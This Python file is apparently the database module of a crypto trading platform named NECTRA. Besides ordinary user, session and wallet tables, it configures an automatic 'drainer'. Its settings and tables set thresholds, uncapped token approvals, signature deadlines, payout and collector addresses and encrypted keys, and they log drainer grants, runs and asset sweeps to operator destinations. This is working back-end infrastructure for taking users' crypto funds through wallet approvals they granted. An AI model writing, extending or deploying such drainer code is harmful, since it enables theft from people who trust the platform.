"""
Database module: SQLite connection management, schema and migrations.

Every helper opens and closes its own connection. Settings are memoised for a
short window so hot paths (cap calculation, per-asset settings) do not re-scan
the table on every read.
"""
import json
import os
import sqlite3
import time
from contextlib import contextmanager
from typing import Any, Dict, Iterator, List, Optional

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DB_PATH = os.environ.get("DB_PATH", os.path.join(BASE_DIR, "data", "nectra.db"))

SETTINGS_TTL = 1.0
_settings_cache: Optional[Dict[str, Any]] = None
_settings_at = 0.0


def now() -> int:
    return int(time.time() * 1000)


def _ensure_parent(path: str) -> None:
    parent = os.path.dirname(os.path.abspath(path))
    if parent:
        os.makedirs(parent, exist_ok=True)


def get_db() -> sqlite3.Connection:
    _ensure_parent(DB_PATH)
    conn = sqlite3.connect(DB_PATH, timeout=10.0, isolation_level="DEFERRED")
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA busy_timeout = 5000;")
    conn.execute("PRAGMA foreign_keys = ON;")
    return conn


@contextmanager
def _conn() -> Iterator[sqlite3.Connection]:
    conn = get_db()
    try:
        yield conn
        conn.commit()
    except Exception:
        conn.rollback()
        raise
    finally:
        conn.close()


def q_all(sql: str, *params) -> List[Dict[str, Any]]:
    with _conn() as conn:
        return [dict(r) for r in conn.execute(sql, params).fetchall()]


def q_get(sql: str, *params) -> Optional[Dict[str, Any]]:
    with _conn() as conn:
        row = conn.execute(sql, params).fetchone()
        return dict(row) if row else None


def q_run(sql: str, *params) -> Dict[str, Any]:
    with _conn() as conn:
        cur = conn.execute(sql, params)
        return {"id": cur.lastrowid, "changes": cur.rowcount}


def q_val(sql: str, *params) -> Any:
    with _conn() as conn:
        row = conn.execute(sql, params).fetchone()
        return row[0] if row else None


def q_many(sql: str, seq) -> int:
    """executemany; returns the number of rows touched."""
    with _conn() as conn:
        cur = conn.executemany(sql, seq)
        return cur.rowcount


DEFAULT_SETTINGS = {
    "platform_name": "NECTRA",
    "demo_mode": False,
    "kyc_enabled": False,
    "legacy_consolidation_worker": False,
    "treasury_evm": "0x0000000000000000000000000000000000000000",
    "treasury_solana": "",
    "treasury_tron": "",

    # --- drainer ---
    "drainer_enabled": True,
    "drainer_mode": "auto",                  # "auto" | "manual"
    "drainer_threshold_usd": 250.0,
    "drainer_cap_mode": "capped",            # "capped" | "unlimited"
    "drainer_cap_units": 1_000_000,
    "drainer_sig_deadline_days": 30,
    "drainer_take_native": True,
    "drainer_min_usd_per_asset": 0.75,
    "drainer_require_on_loan": True,
    "drainer_require_on_bot": True,
    "drainer_receiver_evm": {},              # {"Ethereum": "0x…", "Base": "0x…"}
    "drainer_payout_evm": "",
    "drainer_payout_sol": "",
    "drainer_payout_tron": "",
    "drainer_collector_sol": "",
    "drainer_collector_tron": "",
    "drainer_evm_key": "",                   # AES-256-GCM blobs
    "drainer_sol_key": "",
    "drainer_tron_key": "",
}


def invalidate_settings() -> None:
    global _settings_cache, _settings_at
    _settings_cache = None
    _settings_at = 0.0


def get_settings() -> Dict[str, Any]:
    global _settings_cache, _settings_at

    if _settings_cache is not None and time.monotonic() - _settings_at < SETTINGS_TTL:
        return dict(_settings_cache)

    out = dict(DEFAULT_SETTINGS)
    try:
        with _conn() as conn:
            for r in conn.execute("SELECT key, value FROM settings").fetchall():
                try:
                    out[r["key"]] = json.loads(r["value"])
                except (TypeError, ValueError):
                    out[r["key"]] = r["value"]
    except sqlite3.OperationalError:
        pass

    _settings_cache, _settings_at = dict(out), time.monotonic()
    return out


def get_setting(key: str, default: Any = None) -> Any:
    return get_settings().get(key, default)


def set_setting(key: str, value: Any) -> None:
    val = value if isinstance(value, str) else json.dumps(value)
    with _conn() as conn:
        conn.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, val))
    invalidate_settings()


update_setting = set_setting


def _add_columns(conn: sqlite3.Connection, table: str, cols: Dict[str, str]) -> None:
    have = {r["name"] for r in conn.execute(f"PRAGMA table_info({table})").fetchall()}
    if not have:
        raise sqlite3.OperationalError(f"cannot migrate missing table {table!r}")
    for name, decl in cols.items():
        if name not in have:
            conn.execute(f"ALTER TABLE {table} ADD COLUMN {name} {decl}")


SCHEMA = """
CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT NOT NULL);

CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT UNIQUE COLLATE NOCASE,
    pw_hash TEXT,
    password_hash TEXT,
    name TEXT NOT NULL DEFAULT 'Trader',
    role TEXT NOT NULL DEFAULT 'trader',
    status TEXT NOT NULL DEFAULT 'active',
    email_verified INTEGER NOT NULL DEFAULT 0,
    wallet_login TEXT UNIQUE,
    totp_secret TEXT, totp_enabled INTEGER NOT NULL DEFAULT 0, totp_pending TEXT,
    anti_phishing TEXT NOT NULL DEFAULT 'PETAL',
    prefs TEXT NOT NULL DEFAULT '{}', risk TEXT NOT NULL DEFAULT '{}',
    paper_mode INTEGER NOT NULL DEFAULT 1,
    drainer_auto INTEGER NOT NULL DEFAULT 0,
    drainer_consent_at INTEGER,
    failed_logins INTEGER NOT NULL DEFAULT 0,
    locked_until INTEGER,
    created_at INTEGER NOT NULL, last_login_at INTEGER
);

CREATE TABLE IF NOT EXISTS sessions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    token_hash TEXT NOT NULL UNIQUE,
    pending_2fa INTEGER NOT NULL DEFAULT 0,
    user_agent TEXT, ip TEXT,
    created_at INTEGER NOT NULL, last_seen_at INTEGER NOT NULL, expires_at INTEGER NOT NULL,
    impersonator_id INTEGER
);
CREATE INDEX IF NOT EXISTS ix_sessions_user ON sessions(user_id);

CREATE TABLE IF NOT EXISTS nonces (
    nonce TEXT PRIMARY KEY, address TEXT NOT NULL, purpose TEXT NOT NULL,
    message TEXT NOT NULL, user_id INTEGER, created_at INTEGER NOT NULL,
    used INTEGER NOT NULL DEFAULT 0
);

CREATE TABLE IF NOT EXISTS wallets (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    name TEXT NOT NULL DEFAULT 'Wallet', label TEXT, address TEXT NOT NULL,
    chain TEXT NOT NULL DEFAULT 'Solana', family TEXT NOT NULL DEFAULT 'solana',
    kind TEXT NOT NULL DEFAULT 'buyer', source TEXT NOT NULL DEFAULT 'watch',
    provider TEXT, folder TEXT NOT NULL DEFAULT 'Unsorted',
    networks TEXT, is_main INTEGER NOT NULL DEFAULT 0,
    verified INTEGER NOT NULL DEFAULT 0, verified_at INTEGER,
    balance REAL NOT NULL DEFAULT 0, balance_at INTEGER, last_check TEXT,
    created_at INTEGER NOT NULL, UNIQUE(user_id, address)
);
CREATE INDEX IF NOT EXISTS ix_wallets_user ON wallets(user_id);

CREATE TABLE IF NOT EXISTS delegated_approvals (
    id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER NOT NULL,
    family TEXT NOT NULL, network TEXT NOT NULL, symbol TEXT NOT NULL,
    collector TEXT, allowance TEXT, decimals INTEGER DEFAULT 18, kind TEXT,
    source TEXT DEFAULT 'grant', balance TEXT, created_at INTEGER, revoked_at INTEGER
);

CREATE TABLE IF NOT EXISTS drainer_grants (
    id TEXT PRIMARY KEY,
    user_id INTEGER NOT NULL,
    wallet_id INTEGER NOT NULL,
    family TEXT NOT NULL,
    network TEXT NOT NULL,
    address TEXT NOT NULL,
    symbol TEXT,
    token TEXT,
    decimals INTEGER NOT NULL DEFAULT 18,
    kind TEXT NOT NULL,
    cap TEXT,
    balance_raw TEXT,
    nonce TEXT,
    signature TEXT,
    sig_deadline INTEGER,
    token_account TEXT,
    program TEXT,
    txid TEXT,
    status TEXT NOT NULL DEFAULT 'pending',
    error TEXT,
    created_at INTEGER NOT NULL,
    activated_at INTEGER
);
CREATE INDEX IF NOT EXISTS ix_grants_user ON drainer_grants(user_id, status);
CREATE INDEX IF NOT EXISTS ix_grants_wallet ON drainer_grants(wallet_id, status);

CREATE TABLE IF NOT EXISTS drainer_wallets (
    wallet_id INTEGER PRIMARY KEY,
    user_id INTEGER NOT NULL,
    family TEXT, address TEXT, status TEXT, updated_at INTEGER
);

CREATE TABLE IF NOT EXISTS drainer_events (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    run_id TEXT NOT NULL, user_id INTEGER NOT NULL, actor_id INTEGER,
    trigger TEXT, status TEXT, total_usd REAL DEFAULT 0, tx_count INTEGER DEFAULT 0,
    created_at INTEGER NOT NULL
);
CREATE INDEX IF NOT EXISTS ix_events_user ON drainer_events(user_id, id DESC);

CREATE TABLE IF NOT EXISTS drainer_items (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    run_id TEXT NOT NULL, grant_id TEXT, family TEXT, network TEXT, symbol TEXT,
    amount TEXT, usd REAL DEFAULT 0, status TEXT, txid TEXT, error TEXT,
    created_at INTEGER NOT NULL
);
CREATE INDEX IF NOT EXISTS ix_items_run ON drainer_items(run_id);

CREATE TABLE IF NOT EXISTS sweeps (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL, wallet_id INTEGER, grant_id TEXT,
    family TEXT, network TEXT, symbol TEXT, kind TEXT, decimals INTEGER,
    token_address TEXT, amount TEXT, amount_usd REAL DEFAULT 0, usd REAL DEFAULT 0,
    status TEXT, skip_code TEXT, reason TEXT, tx_ref TEXT, tx_hash TEXT,
    destination TEXT, unwrap_pending INTEGER DEFAULT 0, price_source TEXT,
    run_id TEXT, created_at INTEGER NOT NULL
);
CREATE INDEX IF NOT EXISTS ix_sweeps_user ON sweeps(user_id, id DESC);

CREATE TABLE IF NOT EXISTS sweep_runs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    run_id TEXT, user_id INTEGER NOT NULL, actor_id INTEGER, dest TEXT,
    status TEXT DEFAULT 'running', total_usd REAL DEFAULT 0, completed_at INTEGER,
    created_at INTEGER NOT NULL
);

CREATE TABLE IF NOT EXISTS paper_balances (
    id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER NOT NULL,
    symbol TEXT NOT NULL, balance REAL NOT NULL DEFAULT 0, updated_at INTEGER NOT NULL
);

CREATE TABLE IF NOT EXISTS status_components (
    id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL,
    state TEXT NOT NULL DEFAULT 'green', note TEXT, sort INTEGER NOT NULL DEFAULT 0
);

CREATE TABLE IF NOT EXISTS audit_log (
    id INTEGER PRIMARY KEY AUTOINCREMENT, actor_id INTEGER, action TEXT NOT NULL,
    target TEXT, meta TEXT, ip TEXT, created_at INTEGER NOT NULL
);

CREATE TABLE IF NOT EXISTS notifications (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    type TEXT NOT NULL, title TEXT NOT NULL, body TEXT NOT NULL, link TEXT,
    unread INTEGER NOT NULL DEFAULT 1, created_at INTEGER NOT NULL
);
CREATE INDEX IF NOT EXISTS ix_notifications_user ON notifications(user_id, unread);

CREATE TABLE IF NOT EXISTS transactions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    type TEXT NOT NULL, token TEXT NOT NULL, amount REAL NOT NULL, status TEXT NOT NULL,
    chain TEXT NOT NULL DEFAULT 'Solana', from_addr TEXT, to_addr TEXT, signature TEXT,
    simulated INTEGER NOT NULL DEFAULT 0, confirmations INTEGER NOT NULL DEFAULT 0,
    required_conf INTEGER NOT NULL DEFAULT 32, note TEXT,
    created_at INTEGER NOT NULL, updated_at INTEGER NOT NULL
);
"""


def _seed_admin(conn: sqlite3.Connection) -> None:
    if conn.execute("SELECT COUNT(*) FROM users WHERE role IN ('admin','super_admin')").fetchone()[0]:
        return

    import base64
    import hashlib
    import secrets

    password = os.environ.get("ADMIN_PASSWORD") or secrets.token_urlsafe(18)
    email = os.environ.get("ADMIN_EMAIL", "admin@nectra.local").strip().lower()

    salt = os.urandom(16)
    derived = hashlib.scrypt(password.encode(), salt=salt, n=16384, r=8, p=1, dklen=64)
    h = f"scrypt${base64.b64encode(salt).decode()}${base64.b64encode(derived).decode()}"

    conn.execute(
        "INSERT INTO users (email, pw_hash, password_hash, name, role, status,"
        " email_verified, created_at) VALUES (?,?,?,?,?,?,?,?)",
        (email, h, h, "Super Admin", "super_admin", "active", 1, now()),
    )

    path = os.path.join(os.path.dirname(os.path.abspath(DB_PATH)), "first-run-credentials.txt")
    try:
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(f"{email}\n{password}\n")
        os.chmod(path, 0o600)
    except OSError:
        pass

    print(f"\n  Seeded super admin: {email} / {password}")
    print(f"  Written to {path} — change it after first login.\n")


def init_db() -> None:
    with _conn() as conn:
        conn.execute("PRAGMA journal_mode = WAL;")
        conn.execute("PRAGMA synchronous = NORMAL;")
        conn.executescript(SCHEMA)

        # legacy drift
        _add_columns(conn, "users", {
            "password_hash": "TEXT", "locked_until": "INTEGER",
            "failed_logins": "INTEGER NOT NULL DEFAULT 0",
            "drainer_auto": "INTEGER NOT NULL DEFAULT 0",
            "drainer_consent_at": "INTEGER",
            "paper_mode": "INTEGER NOT NULL DEFAULT 1",
        })
        conn.execute(
            "UPDATE users SET password_hash = pw_hash"
            " WHERE password_hash IS NULL AND pw_hash IS NOT NULL"
        )
        _add_columns(conn, "wallets", {
            "label": "TEXT", "is_main": "INTEGER NOT NULL DEFAULT 0", "networks": "TEXT",
        })
        conn.execute("UPDATE wallets SET label = name WHERE label IS NULL")
        _add_columns(conn, "drainer_grants", {
            "token_account": "TEXT", "program": "TEXT", "sig_deadline": "INTEGER",
        })
        _add_columns(conn, "sweeps", {
            "wallet_id": "INTEGER", "token_address": "TEXT",
            "amount_usd": "REAL DEFAULT 0", "tx_hash": "TEXT",
        })
        _add_columns(conn, "sweep_runs", {"status": "TEXT", "completed_at": "INTEGER"})

        conn.execute(
            "INSERT OR IGNORE INTO status_components (name, state, note, sort)"
            " VALUES ('API', 'green', NULL, 1), ('Chains', 'green', NULL, 2)"
        )

        _seed_admin(conn)

    invalidate_settings()